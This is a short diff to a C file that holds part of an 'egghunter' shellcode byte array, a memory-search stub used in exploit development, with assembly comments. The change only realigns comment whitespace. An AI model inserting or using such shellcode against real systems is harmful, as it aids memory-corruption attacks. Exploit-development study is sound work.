@@ -7,9 +7,9 @@
 
 unsigned char egghunter[] = \
 ""
-"\xfc"       		    // clear direction flag in preparation for scasd 
-"\x31\xd2" 				// clear edx
-"\x31\xc9"   			// clear ecx
+"\xfc"                  // clear direction flag in preparation for scasd 
+"\x31\xd2"              // clear edx
+"\x31\xc9"   		    // clear ecx
 "\x66\x81\xc9\xff\x0f"  // or     cx,0xfff
 "\x41"                  // inc    ecx
 "\x6a\x43"              // push   0x43
